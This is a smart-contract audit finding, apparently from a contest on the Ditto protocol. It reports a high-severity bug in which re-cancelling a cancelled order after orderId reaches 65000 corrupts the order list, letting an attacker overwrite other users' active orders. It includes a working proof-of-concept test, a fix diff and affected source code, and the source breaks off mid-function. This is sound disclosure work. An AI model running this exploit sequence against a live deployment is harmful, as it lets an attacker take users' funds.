{
  "Title": "New orders can overwrite active orders when order id reaches 65000",
  "Content": "# New orders can overwrite active orders when order id reaches 65000\n\n### Severity\nHigh Risk\n\n### Relevant GitHub Links\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/OrdersFacet.sol#L124\">https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/OrdersFacet.sol#L124</a>\n\n\n## Summary\nWhen the orderId for an asset reaches 65000 the `cancelOrderFarFromOracle` allows to cancel an already cancelled order. An attacker can exploit this to overwrite all the active orders in the respective orderbook.  \n\n## Vulnerability Details\nOnce the orderId for an asset reaches 65000 `cancelOrderFarFromOracle` function allows to cancel an order if it's nextId is Constants.TAIL assuming it is the last order in the book.\n```solidity\n    function cancelOrderFarFromOracle(\n        address asset,\n        O orderType,\n        uint16 lastOrderId,\n        uint16 numOrdersToCancel\n    ) external onlyValidAsset(asset) nonReentrant {\n        if (s.asset[asset].orderId < 65000) {\n            revert Errors.OrderIdCountTooLow();\n        }\n\n        if (numOrdersToCancel > 1000) {\n            revert Errors.CannotCancelMoreThan1000Orders();\n        }\n\n        if (msg.sender == LibDiamond.diamondStorage().contractOwner) {\n            if (\n                orderType == O.LimitBid\n                    && s.bids[asset][lastOrderId].nextId == Constants.TAIL\n            ) {\n                s.bids.cancelManyOrders(asset, lastOrderId, numOrdersToCancel);\n            } else if (\n            \n            /// more code. similar deletion for asks and shorts\n            \n            }\n        } else {\n            //@dev if address is not DAO, you can only cancel last order of a side\n            if (\n                orderType == O.LimitBid\n                    && s.bids[asset][lastOrderId].nextId == Constants.TAIL\n            ) {\n                s.bids.cancelOrder(asset, lastOrderId);\n            } else if (\n               \n            /// more code. similar deletion for asks and shorts\n        }\n```\nhttps://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/OrdersFacet.sol#L124-L177C10\n\nBut this assumption is wrong as a previously deleted order can have it's nextId set to Constants.TAIL. This allows an attacker to cancel an already cancelled order which can result in disruption of the linked list maintained for the orders. The attacker can change the route the HEAD's prevId (the cancelled orders list) will take to point to a chain of already existing orders overwriting them when a new order comes. \nWhen there are atleast 2 cancelled orders, re cancelling the closest canceled order to the HEAD (HEAD.prevId) will result in the prevId of the cancelled order pointing to itself. \n\n```solidity\n    function _reuseOrderIds(\n        mapping(address => mapping(uint16 => STypes.Order)) storage orders,\n        address asset,\n        uint16 id,\n        uint16 prevHEAD,\n        O cancelledOrMatched\n    ) private {\n       \n       // more code\n\n       // @audit if the prevHead was order with id itself, then it's prevId will be id\n \n        if (prevHEAD != Constants.HEAD) {\n            orders[asset][id].prevId = prevHEAD;\n        } else {\n``` \nhttps://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibOrders.sol#L356-L377\n\nWhen a new order is created, HEAD.prevId is reused. After which the next HEAD.prevId will be HEAD.prevId.prevId. In this case, it will again point to the same id. But now that the order is placed in the orderbook, the prevId of this order points to another active order which will be overwritten when a new order is created. \n\n### POC Test\n```diff\ndiff --git a/test/CancelOrder.t.sol b/test/CancelOrder.t.sol\nindex e7b9e2f..96c6797 100644\n--- a/test/CancelOrder.t.sol\n+++ b/test/CancelOrder.t.sol\n@@ -7,7 +7,7 @@ import {STypes, MTypes, O, SR} from \"contracts/libraries/DataTypes.sol\";\n import {LibOrders} from \"contracts/libraries/LibOrders.sol\";\n \n import {OBFixture} from \"test/utils/OBFixture.sol\";\n-// import {console} from \"contracts/libraries/console.sol\";\n+import {console} from \"contracts/libraries/console.sol\";\n \n contract CancelOrderTest is OBFixture {\n     using U256 for uint256;\n@@ -317,6 +317,92 @@ contract CancelOrderTest is OBFixture {\n         });\n     }\n \n+    function test_OnceReached65000NewOrdersCanOverwriteExistingOrders() public {\n+        address attacker = address(78);\n+        vm.label(attacker, \"attacker\");\n+\n+        uint80 price1 = 1 ether;\n+        uint80 price2 = 2 ether;\n+        uint80 price3 = 3 ether;\n+        uint80 price4 = 4 ether;\n+        uint80 price5 = 5 ether;\n+        uint80 price6 = 6 ether;\n+        uint80 price7 = 7 ether;\n+        uint80 price8 = 8 ether;\n+\n+        uint88 askAmount = 1 ether;\n+\n+        fundLimitAskOpt(price1, askAmount, receiver);\n+        fundLimitAskOpt(price2, askAmount, receiver);\n+        fundLimitAskOpt(price3, askAmount, receiver);\n+        fundLimitAskOpt(price4, askAmount, receiver);\n+        fundLimitAskOpt(price5, askAmount, receiver);\n+        fundLimitAskOpt(price6, askAmount, receiver);\n+        fundLimitAskOpt(price8, askAmount, receiver);\n+\n+        assertEq(getAsks().length, 7);\n+\n+        //setting order id to 65000 and cancelling 2 orders so as to call cancelOrderFarFromOracle() on a cancelled order which has another previous order\n+        vm.prank(owner);\n+        testFacet.setOrderIdT(asset, 65000);\n+        {\n+            uint80 price100 = 100 ether;\n+\n+            fundLimitAskOpt(price100, askAmount, attacker);\n+            fundLimitAskOpt(price100, askAmount, attacker);\n+\n+            vm.startPrank(attacker);\n+            diamond.cancelAsk(asset, 65001);\n+            diamond.cancelAsk(asset, 65000);\n+        }\n+\n+        //since checking for last order by .next == Constatns.TAIL, most recently cancelled order also satisfies this\n+        //this will make the order point to itself as previous\n+        diamond.cancelOrderFarFromOracle({\n+            asset: asset,\n+            orderType: O.LimitAsk,\n+            lastOrderId: 65000,\n+            numOrdersToCancel: 1\n+        });\n+        vm.stopPrank();\n+\n+        //a new order created now will use this order but the head will still be pointing to this order as the previous order / start of cancel order chain\n+        //hence all upcoming orders will replace the orders backwards starting from price7, id=65000\n+        assertEq(getAsks().length, 7);\n+        fundLimitAskOpt(price7, askAmount, receiver);\n+        assertEq(getAsks().length, 8);\n+        uint256[] memory replacingOrders = new uint[](7);\n+        uint256 replacingOrderIndex = 0;\n+        {\n+            STypes.Order[] memory asks = getAsks();\n+            // now all orders from 7 to 1 are that of receivers\n+            for (uint256 i = 0; i < asks.length; i++) {\n+                assertEq(asks[i].addr, receiver);\n+                if (asks[i].price != price8) {\n+                    replacingOrders[replacingOrderIndex] = asks[i].id;\n+                    replacingOrderIndex++;\n+                }\n+            }\n+        }\n+        {\n+            //these orders replaces previous orders of the receiver\n+            fundLimitAskOpt(price7, askAmount, attacker);\n+            fundLimitAskOpt(price6, askAmount, attacker);\n+            fundLimitAskOpt(price5, askAmount, attacker);\n+            fundLimitAskOpt(price4, askAmount, attacker);\n+            fundLimitAskOpt(price3, askAmount, attacker);\n+            fundLimitAskOpt(price2, askAmount, attacker);\n+            fundLimitAskOpt(price1, askAmount, attacker);\n+        }\n+\n+        //all orders are that of the attacker\n+        for (uint256 i = 0; i < 7; i++) {\n+            STypes.Order memory ask =\n+                diamond.getAskOrder(asset, uint16(replacingOrders[i]));\n+            assertEq(ask.addr, attacker);\n+        }\n+    }\n+\n     //NON-DAO\n     function testRevertNotLastOrder() public {\n         setOrderIdAndMakeOrders({orderType: O.LimitBid});\n```\n\n## Impact\nUsers having an active order at present or in future will loose their funds.\n\n## Recommendation\nAdd to checks to see if the order is already cancelled. Since this function also doesn't reimburse funds it would be best to change it to the way a normal cancel order function would work except that msg.sender could be anybody.\n\n```diff\ndiff --git a/contracts/facets/OrdersFacet.sol b/contracts/facets/OrdersFacet.sol\nindex 0a924e7..7cbb8bd 100644\n--- a/contracts/facets/OrdersFacet.sol\n+++ b/contracts/facets/OrdersFacet.sol\n@@ -59,6 +59,11 @@ contract OrdersFacet is Modifiers {\n     {\n         STypes.Order storage ask = s.asks[asset][id];\n         if (msg.sender != ask.addr) revert Errors.NotOwner();\n+        _cancelAsk(asset, id);\n+    }\n+\n+    function _cancelAsk(address asset, uint16 id) internal {\n+        STypes.Order storage ask = s.asks[asset][id];\n         O orderType = ask.orderType;\n         if (orderType == O.Cancelled || orderType == O.Matched) {\n             revert Errors.NotActiveOrder();\n@@ -165,7 +170,8 @@ contract OrdersFacet is Modifiers {\n                 orderType == O.LimitAsk\n                     && s.asks[asset][lastOrderId].nextId == Constants.TAIL\n             ) {\n-                s.asks.cancelOrder(asset, lastOrderId);\n+                _cancelAsk(asset, lastOrderId);\n+                // s.asks.cancelOrder(asset, lastOrderId);\n             } else if (\n                 orderType == O.LimitShort\n                     && s.shorts[asset][lastOrderId].nextId == Constants.TAIL\n\n```\nSimilar changes to bids and shorts",
  "Impact": "HIGH",
  "Source": "https://www.codehawks.com/contests/clm871gl00001mp081mzjdlwc",
  "Code": [
    {
      "filename": "contracts/facets/OrdersFacet.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-only\npragma solidity 0.8.21;\n\nimport {U256, U88} from \"contracts/libraries/PRBMathHelper.sol\";\n\nimport {Modifiers} from \"contracts/libraries/AppStorage.sol\";\nimport {Errors} from \"contracts/libraries/Errors.sol\";\nimport {STypes, O, SR} from \"contracts/libraries/DataTypes.sol\";\nimport {LibDiamond} from \"contracts/libraries/LibDiamond.sol\";\nimport {LibOrders} from \"contracts/libraries/LibOrders.sol\";\nimport {LibOracle} from \"contracts/libraries/LibOracle.sol\";\nimport {LibShortRecord} from \"contracts/libraries/LibShortRecord.sol\";\nimport {Constants} from \"contracts/libraries/Constants.sol\";\n\n// import {console} from \"contracts/libraries/console.sol\";\n\ncontract OrdersFacet is Modifiers {\n    using U256 for uint256;\n    using U88 for uint88;\n    using LibOrders for mapping(address => mapping(uint16 => STypes.Order));\n\n    /**\n     * @notice Cancels unfilled bid on market\n     *\n     * @param asset The market that will be impacted\n     * @param id Id of bid\n     */\n\n    function cancelBid(address asset, uint16 id)\n        external\n        onlyValidAsset(asset)\n        nonReentrant\n    {\n        STypes.Order storage bid = s.bids[asset][id];\n        if (msg.sender != bid.addr) revert Errors.NotOwner();\n        O orderType = bid.orderType;\n        if (orderType == O.Cancelled || orderType == O.Matched) {\n            revert Errors.NotActiveOrder();\n        }\n\n        uint256 vault = s.asset[asset].vault;\n        uint88 eth = bid.ercAmount.mulU88(bid.price);\n        s.vaultUser[vault][msg.sender].ethEscrowed += eth;\n\n        s.bids.cancelOrder(asset, id);\n    }\n\n    /**\n     * @notice Cancels unfilled ask on market\n     *\n     * @param asset The market that will be impacted\n     * @param id Id of ask\n     */\n\n    function cancelAsk(address asset, uint16 id)\n        external\n        onlyValidAsset(asset)\n        nonReentrant\n    {\n        STypes.Order storage ask = s.asks[asset][id];\n        if (msg.sender != ask.addr) revert Errors.NotOwner();\n        O orderType = ask.orderType;\n        if (orderType == O.Cancelled || orderType == O.Matched) {\n            revert Errors.NotActiveOrder();\n        }\n\n        s.assetUser[asset][msg.sender].ercEscrowed += ask.ercAmount;\n\n        s.asks.cancelOrder(asset, id);\n    }\n\n    /**\n     * @notice Cancels unfilled short on market\n     *\n     * @param asset The market that will be impacted\n     * @param id Id of short\n     */\n\n    function cancelShort(address asset, uint16 id)\n        external\n        onlyValidAsset(asset)\n        nonReentrant\n    {\n        STypes.Order storage short = s.shorts[asset][id];\n        if (msg.sender != short.addr) revert Errors.NotOwner();\n        O orderType = short.orderType;\n        if (orderType == O.Cancelled || orderType == O.Matched) {\n            revert Errors.NotActiveOrder();\n        }\n\n        STypes.Asset storage Asset = s.asset[asset];\n        uint88 eth = short.ercAmount.mulU88(short.price).mulU88(\n            LibOrders.convertCR(short.initialMargin)\n        );\n        s.vaultUser[Asset.vault][msg.sender].ethEscrowed += eth;\n\n        // Update ShortRecord if exists\n        uint8 shortRecordId = short.shortRecordId;\n        if (shortRecordId >= Constants.SHORT_STARTING_ID) {\n            STypes.ShortRecord storage shortRecord =\n                s.shortRecords[asset][msg.sender][shortRecordId];\n            if (shortRecord.status == SR.Cancelled) {\n                LibShortRecord.deleteShortRecord(asset, msg.sender, shortRecordId);\n            } else {\n                shortRecord.status = SR.FullyFilled;\n            }\n        }\n\n        // Approximating the startingShortId, rather than expecting exact match\n        if (id == Asset.startingShortId) {\n            uint256 oraclePrice = LibOracle.getPrice(asset);\n            uint256 prevPrice = s.shorts[asset][short.prevId].price;\n            if (prevPrice >= oraclePrice) {\n                Asset.startingShortId = short.prevId;\n            } else {\n                Asset.startingShortId = short.nextId;\n            }\n        }\n\n        s.shorts.cancelOrder(asset, id);\n    }\n\n    //@dev public function to handle when orderId has hit limit. Used to deter attackers\n    function cancelOrderFarFromOracle(\n        address asset,\n        O orderType,\n        uint16 lastOrderId,\n        uint16 numOrdersToCancel\n    ) external onlyValidAsset(asset) nonReentrant {\n        if (s.asset[asset].orderId < 65000) {\n            revert Errors.OrderIdCountTooLow();\n        }\n\n        if (numOrdersToCancel > 1000) {\n            revert Errors.CannotCancelMoreThan1000Orders();\n        }\n\n        if (msg.sender == LibDiamond.diamondStorage().contractOwner) {\n            if (\n                orderType == O.LimitBid\n                    && s.bids[asset][lastOrderId].nextId == Constants.TAIL\n            ) {\n                s.bids.cancelManyOrders(asset, lastOrderId, numOrdersToCancel);\n            } else if (\n                orderType == O.LimitAsk\n                    && s.asks[asset][lastOrderId].nextId == Constants.TAIL\n            ) {\n                s.asks.cancelManyOrders(asset, lastOrderId, numOrdersToCancel);\n            } else if (\n                orderType == O.LimitShort\n                    && s.shorts[asset][lastOrderId].nextId == Constants.TAIL\n            ) {\n                s.shorts.cancelManyOrders(asset, lastOrderId, numOrdersToCancel);\n            } else {\n                revert Errors.NotLastOrder();\n            }\n        } else {\n            //@dev if address is not DAO, you can only cancel last order of a side\n            if (\n                orderType == O.LimitBid\n                    && s.bids[asset][lastOrderId].nextId == Constants.TAIL\n            ) {\n                s.bids.cancelOrder(asset, lastOrderId);\n            } else if (\n                orderType == O.LimitAsk\n                    && s.asks[asset][lastOrderId].nextId == Constants.TAIL\n            ) {\n                s.asks.cancelOrder(asset, lastOrderId);\n            } else if (\n                orderType == O.LimitShort\n                    && s.shorts[asset][lastOrderId].nextId == Constants.TAIL\n            ) {\n                s.shorts.cancelOrder(asset, lastOrderId);\n            } else {\n                revert Errors.NotLastOrder();\n            }\n        }\n    }\n}"
    },
    {
      "filename": "contracts/facets/OrdersFacet.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-only\npragma solidity 0.8.21;\n\nimport {U256, U88} from \"contracts/libraries/PRBMathHelper.sol\";\n\nimport {Modifiers} from \"contracts/libraries/AppStorage.sol\";\nimport {Errors} from \"contracts/libraries/Errors.sol\";\nimport {STypes, O, SR} from \"contracts/libraries/DataTypes.sol\";\nimport {LibDiamond} from \"contracts/libraries/LibDiamond.sol\";\nimport {LibOrders} from \"contracts/libraries/LibOrders.sol\";\nimport {LibOracle} from \"contracts/libraries/LibOracle.sol\";\nimport {LibShortRecord} from \"contracts/libraries/LibShortRecord.sol\";\nimport {Constants} from \"contracts/libraries/Constants.sol\";\n\n// import {console} from \"contracts/libraries/console.sol\";\n\ncontract OrdersFacet is Modifiers {\n    using U256 for uint256;\n    using U88 for uint88;\n    using LibOrders for mapping(address => mapping(uint16 => STypes.Order));\n\n    /**\n     * @notice Cancels unfilled bid on market\n     *\n     * @param asset The market that will be impacted\n     * @param id Id of bid\n     */\n\n    function cancelBid(address asset, uint16 id)\n        external\n        onlyValidAsset(asset)\n        nonReentrant\n    {\n        STypes.Order storage bid = s.bids[asset][id];\n        if (msg.sender != bid.addr) revert Errors.NotOwner();\n        O orderType = bid.orderType;\n        if (orderType == O.Cancelled || orderType == O.Matched) {\n            revert Errors.NotActiveOrder();\n        }\n\n        uint256 vault = s.asset[asset].vault;\n        uint88 eth = bid.ercAmount.mulU88(bid.price);\n        s.vaultUser[vault][msg.sender].ethEscrowed += eth;\n\n        s.bids.cancelOrder(asset, id);\n    }\n\n    /**\n     * @notice Cancels unfilled ask on market\n     *\n     * @param asset The market that will be impacted\n     * @param id Id of ask\n     */\n\n    function cancelAsk(address asset, uint16 id)\n        external\n        onlyValidAsset(asset)\n        nonReentrant\n    {\n        STypes.Order storage ask = s.asks[asset][id];\n        if (msg.sender != ask.addr) revert Errors.NotOwner();\n        O orderType = ask.orderType;\n        if (orderType == O.Cancelled || orderType == O.Matched) {\n            revert Errors.NotActiveOrder();\n        }\n\n        s.assetUser[asset][msg.sender].ercEscrowed += ask.ercAmount;\n\n        s.asks.cancelOrder(asset, id);\n    }\n\n    /**\n     * @notice Cancels unfilled short on market\n     *\n     * @param asset The market that will be impacted\n     * @param id Id of short\n     */\n\n    function cancelShort(address asset, uint16 id)\n        external\n        onlyValidAsset(asset)\n        nonReentrant\n    {\n        STypes.Order storage short = s.shorts[asset][id];\n        if (msg.sender != short.addr) revert Errors.NotOwner();\n        O orderType = short.orderType;\n        if (orderType == O.Cancelled || orderType == O.Matched) {\n            revert Errors.NotActiveOrder();\n        }\n\n        STypes.Asset storage Asset = s.asset[asset];\n        uint88 eth = short.ercAmount.mulU88(short.price).mulU88(\n            LibOrders.convertCR(short.initialMargin)\n        );\n        s.vaultUser[Asset.vault][msg.sender].ethEscrowed += eth;\n\n        // Update ShortRecord if exists\n        uint8 shortRecordId = short.shortRecordId;\n        if (shortRecordId >= Constants.SHORT_STARTING_ID) {\n            STypes.ShortRecord storage shortRecord =\n                s.shortRecords[asset][msg.sender][shortRecordId];\n            if (shortRecord.status == SR.Cancelled) {\n                LibShortRecord.deleteShortRecord(asset, msg.sender, shortRecordId);\n            } else {\n                shortRecord.status = SR.FullyFilled;\n            }\n        }\n\n        // Approximating the startingShortId, rather than expecting exact match\n        if (id == Asset.startingShortId) {\n            uint256 oraclePrice = LibOracle.getPrice(asset);\n            uint256 prevPrice = s.shorts[asset][short.prevId].price;\n            if (prevPrice >= oraclePrice) {\n                Asset.startingShortId = short.prevId;\n            } else {\n                Asset.startingShortId = short.nextId;\n            }\n        }\n\n        s.shorts.cancelOrder(asset, id);\n    }\n\n    //@dev public function to handle when orderId has hit limit. Used to deter attackers\n    function cancelOrderFarFromOracle(\n        address asset,\n        O orderType,\n        uint16 lastOrderId,\n        uint16 numOrdersToCancel\n    ) external onlyValidAsset(asset) nonReentrant {\n        if (s.asset[asset].orderId < 65000) {\n            revert Errors.OrderIdCountTooLow();\n        }\n\n        if (numOrdersToCancel > 1000) {\n            revert Errors.CannotCancelMoreThan1000Orders();\n        }\n\n        if (msg.sender == LibDiamond.diamondStorage().contractOwner) {\n            if (\n                orderType == O.LimitBid\n                    && s.bids[asset][lastOrderId].nextId == Constants.TAIL\n            ) {\n                s.bids.cancelManyOrders(asset, lastOrderId, numOrdersToCancel);\n            } else if (\n                orderType == O.LimitAsk\n                    && s.asks[asset][lastOrderId].nextId == Constants.TAIL\n            ) {\n                s.asks.cancelManyOrders(asset, lastOrderId, numOrdersToCancel);\n            } else if (\n                orderType == O.LimitShort\n                    && s.shorts[asset][lastOrderId].nextId == Constants.TAIL\n            ) {\n                s.shorts.cancelManyOrders(asset, lastOrderId, numOrdersToCancel);\n            } else {\n                revert Errors.NotLastOrder();\n            }\n        } else {\n            //@dev if address is not DAO, you can only cancel last order of a side\n            if (\n                orderType == O.LimitBid\n                    && s.bids[asset][lastOrderId].nextId == Constants.TAIL\n            ) {\n                s.bids.cancelOrder(asset, lastOrderId);\n            } else if (\n                orderType == O.LimitAsk\n                    && s.asks[asset][lastOrderId].nextId == Constants.TAIL\n            ) {\n                s.asks.cancelOrder(asset, lastOrderId);\n            } else if (\n                orderType == O.LimitShort\n                    && s.shorts[asset][lastOrderId].nextId == Constants.TAIL\n            ) {\n                s.shorts.cancelOrder(asset, lastOrderId);\n            } else {\n                revert Errors.NotLastOrder();\n            }\n        }\n    }\n}"
    },
    {
      "filename": "contracts/libraries/LibOrders.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-only\npragma solidity 0.8.21;\n\nimport {U256, Math104, U80, U88} from \"contracts/libraries/PRBMathHelper.sol\";\n\nimport {AppStorage, appStorage} from \"contracts/libraries/AppStorage.sol\";\nimport {STypes, MTypes, O, SR, OF} from \"contracts/libraries/DataTypes.sol\";\nimport {Errors} from \"contracts/libraries/Errors.sol\";\nimport {Events} from \"contracts/libraries/Events.sol\";\nimport {LibOracle} from \"contracts/libraries/LibOracle.sol\";\nimport {LibShortRecord} from \"contracts/libraries/LibShortRecord.sol\";\nimport {Constants} from \"contracts/libraries/Constants.sol\";\n\n// import {console} from \"contracts/libraries/console.sol\";\n\nlibrary LibOrders {\n    using LibOracle for address;\n    using U256 for uint256;\n    using Math104 for uint104;\n    using U80 for uint80;\n    using U88 for uint88;\n\n    // @dev in seconds\n    function getOffsetTime() internal view returns (uint32 timeInSeconds) {\n        // shouldn't overflow in 136 years\n        return uint32(block.timestamp - Constants.STARTING_TIME); // @dev(safe-cast)\n    }\n\n    // @dev in hours\n    function getOffsetTimeHours() internal view returns (uint24 timeInHours) {\n        return uint24(getOffsetTime() / 1 hours);\n    }\n\n    function convertCR(uint16 cr) internal pure returns (uint256) {\n        return (uint256(cr) * 1 ether) / Constants.TWO_DECIMAL_PLACES;\n    }\n\n    // For matched token reward\n    function increaseSharesOnMatch(\n        address asset,\n        STypes.Order memory order,\n        MTypes.Match memory matchTotal,\n        uint88 eth\n    ) internal {\n        AppStorage storage s = appStorage();\n\n        // @dev use the diff to get more time (2159), to prevent overflow at year 2106\n        uint32 timeTillMatch = getOffsetTime() - order.creationTime;\n        if (timeTillMatch > Constants.MIN_DURATION) {\n            // shares in eth-days\n            uint88 shares = eth * (timeTillMatch / 1 days);\n            matchTotal.dittoMatchedShares += shares;\n\n            uint256 vault = s.asset[asset].vault;\n            s.vaultUser[vault][order.addr].dittoMatchedShares += shares;\n        }\n    }\n\n    function currentOrders(\n        mapping(address => mapping(uint16 => STypes.Order)) storage orders,\n        address asset\n    ) internal view returns (STypes.Order[] memory) {\n        uint16 currentId = orders[asset][Constants.HEAD].nextId;\n        uint256 size;\n\n        while (currentId != Constants.TAIL) {\n            size++;\n            currentId = orders[asset][currentId].nextId;\n        }\n\n        STypes.Order[] memory list = new STypes.Order[](size);\n        currentId = orders[asset][Constants.HEAD].nextId; // reset currentId\n\n        for (uint256 i = 0; i < size; i++) {\n            list[i] = orders[asset][currentId];\n            currentId = orders[asset][currentId].nextId;\n        }\n        return list;\n    }\n\n    function isShort(STypes.Order memory order) internal pure returns (bool) {\n        return order.orderType == O.LimitShort;\n    }\n\n    function addBid(\n        address asset,\n        STypes.Order memory order,\n        MTypes.OrderHint[] memory orderHintArray\n    ) internal {\n        AppStorage storage s = appStorage();\n        uint16 hintId;\n\n        if (order.orderType == O.MarketBid) {\n            return;\n        }\n        uint16 nextId = s.bids[asset][Constants.HEAD].nextId;\n        if (order.price > s.bids[asset][nextId].price || nextId == Constants.TAIL) {\n            hintId = Constants.HEAD;\n        } else {\n            hintId = findOrderHintId(s.bids, asset, orderHintArray);\n        }\n\n        addOrder(s.bids, asset, order, hintId);\n\n        uint256 vault = s.asset[asset].vault;\n        uint88 eth = order.ercAmount.mulU88(order.price);\n        s.vaultUser[vault][order.addr].ethEscrowed -= eth;\n    }\n\n    function addAsk(\n        address asset,\n        STypes.Order memory order,\n        MTypes.OrderHint[] memory orderHintArray\n    ) internal {\n        AppStorage storage s = appStorage();\n        uint16 hintId;\n\n        if (order.orderType == O.MarketAsk) {\n            return;\n        }\n        uint16 nextId = s.asks[asset][Constants.HEAD].nextId;\n        if (order.price < s.asks[asset][nextId].price || nextId == Constants.TAIL) {\n            hintId = Constants.HEAD;\n        } else {\n            hintId = findOrderHintId(s.asks, asset, orderHintArray);\n        }\n        addOrder(s.asks, asset, order, hintId);\n\n        s.assetUser[asset][order.addr].ercEscrowed -= order.ercAmount;\n    }\n\n    /**\n     * @notice Add short struct onto market\n     *\n     * @param asset The market that will be impacted\n     * @param order The short struct passed from shortMatchAlgo\n     * @param orderHintArray array of Id passed in front end for optimized looping\n     */\n\n    function addShort(\n        address asset,\n        STypes.Order memory order,\n        MTypes.OrderHint[] memory orderHintArray\n    ) internal {\n        AppStorage storage s = appStorage();\n        uint16 hintId;\n        uint16 nextId = s.shorts[asset][Constants.HEAD].nextId;\n        if (order.price < s.shorts[asset][nextId].price || nextId == Constants.TAIL) {\n            hintId = Constants.HEAD;\n        } else {\n            hintId = findOrderHintId(s.shorts, asset, orderHintArray);\n        }\n\n        //@dev: Only need to set this when placing incomingShort onto market\n        addOrder(s.shorts, asset, order, hintId);\n        updateStartingShortIdViaShort(asset, order);\n        uint256 vault = s.asset[asset].vault;\n        uint88 eth = order.ercAmount.mulU88(order.price).mulU88(\n            LibOrders.convertCR(order.initialMargin)\n        );\n        s.vaultUser[vault][order.addr].ethEscrowed -= eth;\n    }\n\n    /**\n     * @notice Add ask/short struct onto market\n     *\n     * @param asset The market that will be impacted\n     * @param incomingOrder The ask or short struct passed from sellMatchAlgo\n     * @param orderHintArray array of Id passed in front end for optimized looping\n     */\n\n    function addSellOrder(\n        STypes.Order memory incomingOrder,\n        address asset,\n        MTypes.OrderHint[] memory orderHintArray\n    ) private {\n        O o = normalizeOrderType(incomingOrder.orderType);\n        if (o == O.LimitShort) {\n            addShort(asset, incomingOrder, orderHintArray);\n        } else if (o == O.LimitAsk) {\n            addAsk(asset, incomingOrder, orderHintArray);\n        }\n    }\n\n    /**\n     * @notice Adds order onto market\n     * @dev Reuses order ids for gas saving and id recycling\n     *\n     * @param orders the order mapping\n     * @param asset The market that will be impacted\n     * @param incomingOrder Bid, Ask, or Short Order\n     * @param hintId Id passed in front end for optimized looping\n     */\n\n    // @dev partial addOrder\n    function addOrder(\n        mapping(address => mapping(uint16 => STypes.Order)) storage orders,\n        address asset,\n        STypes.Order memory incomingOrder,\n        uint16 hintId\n    ) private {\n        AppStorage storage s = appStorage();\n        // hint.prevId <-> hint <-> hint.nextId\n        // set links of incoming to hint\n        uint16 prevId = findPrevOfIncomingId(orders, asset, incomingOrder, hintId);\n        uint16 nextId = orders[asset][prevId].nextId;\n        incomingOrder.prevId = prevId;\n        incomingOrder.nextId = nextId;\n        uint16 id = incomingOrder.id;\n        uint16 canceledID = orders[asset][Constants.HEAD].prevId;\n        // @dev (ID) is exiting, [ID] is inserted\n        // in this case, the protocol is re-using (ID) and moving it to [ID]\n        // check if a previously cancelled or matched order exists\n        if (canceledID != Constants.HEAD) {\n            incomingOrder.prevOrderType = orders[asset][canceledID].orderType;\n            // BEFORE: CancelledID <- (ID) <- HEAD <-> .. <-> PREV <----------> NEXT\n            // AFTER1: CancelledID <--------- HEAD <-> .. <-> PREV <-> [ID] <-> NEXT\n            uint16 prevCanceledID = orders[asset][canceledID].prevId;\n            if (prevCanceledID != Constants.HEAD) {\n                orders[asset][Constants.HEAD].prevId = prevCanceledID;\n            } else {\n                // BEFORE: HEAD <- (ID) <- HEAD <-> .. <-> PREV <----------> NEXT\n                // AFTER1: HEAD <--------- HEAD <-> .. <-> PREV <-> [ID] <-> NEXT\n                orders[asset][Constants.HEAD].prevId = Constants.HEAD;\n            }\n            // re-use the previous order's id\n            id = incomingOrder.id = canceledID;\n        } else {\n            // BEFORE: HEAD <-> .. <-> PREV <--------------> NEXT\n            // AFTER1: HEAD <-> .. <-> PREV <-> (NEW ID) <-> NEXT\n            // otherwise just increment to a new order id\n            // and the market grows in height/size\n            s.asset[asset].orderId += 1;\n        }\n        orders[asset][id] = incomingOrder;\n        if (nextId != Constants.TAIL) {\n            orders[asset][nextId].prevId = incomingOrder.id;\n        }\n\n        orders[asset][prevId].nextId = incomingOrder.id;\n    }\n\n    /**\n     * @notice Verifies that bid id is between two id based on price\n     *\n     * @param asset The market that will be impacted\n     * @param _prevId The first id supposedly preceding the new price\n     * @param _newPrice price of prospective order\n     * @param _nextId The first id supposedly following the new price\n     *\n     * @return direction int direction to search (PREV, EXACT, NEXT)\n     */\n\n    function verifyBidId(address asset, uint16 _prevId, uint256 _newPrice, uint16 _nextId)\n        internal\n        view\n        returns (int256 direction)\n    {\n        AppStorage storage s = appStorage();\n        //@dev: TAIL can't be prevId because it will always be last item in list\n        bool check1 =\n            s.bids[asset][_prevId].price >= _newPrice || _prevId == Constants.HEAD;\n        bool check2 =\n            _newPrice > s.bids[asset][_nextId].price || _nextId == Constants.TAIL;\n\n        if (check1 && check2) {\n            return Constants.EXACT;\n        } else if (!check1) {\n            return Constants.PREV;\n        } else if (!check2) {\n            return Constants.NEXT;\n        }\n    }\n\n    /**\n     * @notice Verifies that short id is between two id based on price\n     *\n     * @param asset The market that will be impacted\n     * @param _prevId The first id supposedly preceding the new price\n     * @param _newPrice price of prospective order\n     * @param _nextId The first id supposedly following the new price\n     *\n     * @return direction int direction to search (PREV, EXACT, NEXT)\n     */\n    function verifySellId(\n        mapping(address => mapping(uint16 => STypes.Order)) storage orders,\n        address asset,\n        uint16 _prevId,\n        uint256 _newPrice,\n        uint16 _nextId\n    ) private view returns (int256 direction) {\n        //@dev: TAIL can't be prevId because it will always be last item in list\n        bool check1 =\n            orders[asset][_prevId].price <= _newPrice || _prevId == Constants.HEAD;\n\n        bool check2 =\n            _newPrice < orders[asset][_nextId].price || _nextId == Constants.TAIL;\n\n        if (check1 && check2) {\n            return Constants.EXACT;\n        } else if (!check1) {\n            return Constants.PREV;\n        } else if (!check2) {\n            return Constants.NEXT;\n        }\n    }\n\n    /**\n     * @notice Handles the reordering of market when order is canceled\n     * @dev Reuses order ids for gas saving and id recycling\n     *\n     * @param orders the order mapping\n     * @param asset The market that will be impacted\n     * @param id Id of order\n     */\n\n    function cancelOrder(\n        mapping(address => mapping(uint16 => STypes.Order)) storage orders,\n        address asset,\n        uint16 id\n    ) internal {\n        // save this since it may be replaced\n        uint16 prevHEAD = orders[asset][Constants.HEAD].prevId;\n\n        // remove the links of ID in the market\n        // @dev (ID) is exiting, [ID] is inserted\n        // BEFORE: PREV <-> (ID) <-> NEXT\n        // AFTER : PREV <----------> NEXT\n        